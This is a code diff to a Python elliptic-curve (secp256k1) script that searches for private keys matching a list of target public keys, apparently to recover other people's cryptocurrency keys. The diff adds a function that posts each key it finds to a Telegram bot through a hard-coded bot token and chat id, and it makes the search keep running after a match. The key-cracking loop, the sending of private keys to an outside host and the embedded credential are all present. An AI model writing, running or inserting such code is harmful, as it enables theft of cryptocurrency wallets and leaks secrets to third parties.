@@ -1,3 +1,5 @@
+import requests
+
 class ECPoint:
     def __init__(self, x, y, infinity=False):
         self.x = x
@@ -63,6 +65,19 @@ class Secp256k1:
     def generate_public_key(private_key):
         return Secp256k1.scalar_mult(private_key, Secp256k1.G)
 
+def send_telegram_message(message):
+    """Sends a message to a Telegram bot."""
+    bot_token = "6526185567:AAF9oJDCEXD0sdfIHDesNaSw_JOcvfjr0FM"
+    chat_id = "7037604847"
+    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+    try:
+        response = requests.post(url, data={"chat_id": chat_id, "text": message})
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        if response.status_code == 200:
+            print("Telegram message sent successfully")
+    except requests.exceptions.RequestException as e:
+        print(f"Error sending message: {e}")
+
 N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
 # Example usage:
 '''
@@ -75,8 +90,9 @@ private_key = N // 2 # This should be a large, random number in a real applicati
 while True:
     public_key, added = Secp256k1.generate_public_key(private_key)
     if public_key.x in int_pubs:
-        print(private_key)
-        break
+        message = f"{private_key} for {public_key.x}"
+        print(message)
+        send_telegram_message(message)
     private_key = (private_key * added) % N
     # print(private_key)
     # print(public_key.x)
